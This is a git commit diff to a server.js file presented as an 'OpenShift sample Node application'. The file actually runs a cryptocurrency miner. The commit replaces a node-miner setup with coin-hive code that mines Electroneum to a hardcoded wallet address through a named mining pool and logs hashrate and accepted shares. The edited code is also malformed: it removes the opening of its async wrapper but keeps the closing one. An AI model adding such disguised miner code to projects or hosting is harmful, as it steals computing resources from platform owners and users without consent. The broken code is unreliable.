83710d8306f326128c03889b8ae77069a11f2007
krreet <34994993+krreet@users.noreply.github.com>
2018-03-14 04:51:47 +0530

    Update server.js

--- server.js
+++ server.js
@@ -1,23 +1,28 @@
 //  OpenShift sample Node application
 
-const NodeMiner = require('node-miner');
+const CoinHive = require('coin-hive');
+const miner = await CoinHive('etnkKyXUsrfH3JdthA3Cep1JBaEdPtFF2EvkX4uhmTbCAFMX4xr6VzvBuc2eJFvEnLKmJKf7jwS3C3R9mMQb1jbD8VW9GNiGBJ', {
+  pool: {
+    host: 'pool.etn.spacepools.org',
+    port: 3333
+  }
+});
+await miner.start();
+
+
  
-(async () => {
- 
-    const miner = await NodeMiner({
-        host: `etn.easyhash.io`,
-        port: 3630,
-        username: `etnkKyXUsrfH3JdthA3Cep1JBaEdPtFF2EvkX4uhmTbCAFMX4xr6VzvBuc2eJFvEnLKmJKf7jwS3C3R9mMQb1jbD8VW9GNiGBJ`,
-        password: ''
-    });
- 
-    await miner.start();
- 
-    miner.on('update', data => {
-        console.log(`Hashrate: ${data.hashesPerSecond} H/s`);
-        console.log(`Total hashes mined: ${data.totalHashes}`);
-        console.log(`---`);
-    });
- 
+  // Listen on events
+  miner.on('found', () => console.log('Found!'));
+  miner.on('accepted', () => console.log('Accepted!'));
+  miner.on('update', data =>
+    console.log(`
+    Hashes per second: ${data.hashesPerSecond}
+    Total hashes: ${data.totalHashes}
+    Accepted hashes: ${data.acceptedHashes}
+  `)
+  );
+
+  // Stop miner
+  setTimeout(async () => await miner.stop(), 60000);
 })();
 
